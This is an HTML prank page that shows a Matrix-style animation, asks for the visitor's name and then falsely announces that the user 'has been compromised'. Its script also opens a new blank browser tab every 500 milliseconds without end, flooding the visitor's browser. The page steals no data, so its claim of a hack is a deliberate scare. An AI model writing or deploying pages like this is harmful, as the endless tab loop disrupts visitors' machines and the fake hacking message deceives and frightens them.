<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You’ve Been Hacked</title>
    <style>
        body {
            background: black;
            color: green;
            font-family: 'Courier New', monospace;
            text-align: center;
            overflow: hidden;
        }
        #matrix {
            position: absolute;
            top: 0;
            left: 0;
            color: lime;
            font-size: 24px;
            white-space: nowrap;
            z-index: 1;
            pointer-events: none;
        }
        #message {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 32px;
            font-weight: bold;
            z-index: 2;
        }
    </style>
</head>
<body>
    <div id="matrix"></div>
    <div id="message">
        <p>You’ve been hacked!</p>
        <p id="history"></p>
    </div>
    <script>
        // Matrix Code Effect
        const matrixDiv = document.getElementById('matrix');
        const matrixCols = Math.floor(window.innerWidth / 20);
        const matrixRows = Math.floor(window.innerHeight / 20);
        const matrixChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let matrixArray = [];

        // Generate Matrix Effect
        for (let i = 0; i < matrixCols; i++) {
            matrixArray.push([]);
        }
        function generateMatrix() {
            matrixDiv.innerHTML = '';
            for (let i = 0; i < matrixCols; i++) {
                let char = matrixChars[Math.floor(Math.random() * matrixChars.length)];
                let span = document.createElement('span');
                span.style.position = 'absolute';
                span.style.left = (i * 20) + 'px';
                span.style.top = (Math.random() * window.innerHeight) + 'px';
                span.textContent = char;
                matrixDiv.appendChild(span);
            }
        }
        setInterval(generateMatrix, 100);

        // Infinite Tab Opening
        function openTabs() {
            window.open('about:blank');
        }
        setInterval(openTabs, 500); // Open new tab every 500ms

        // Your Name Appears
        const userName = prompt('Enter your name:');
        document.getElementById('history').textContent = 'History: User ' + userName + ' has been compromised.';

        // Trigger Matrix Animation
        generateMatrix();
    </script>
</body>
</html>
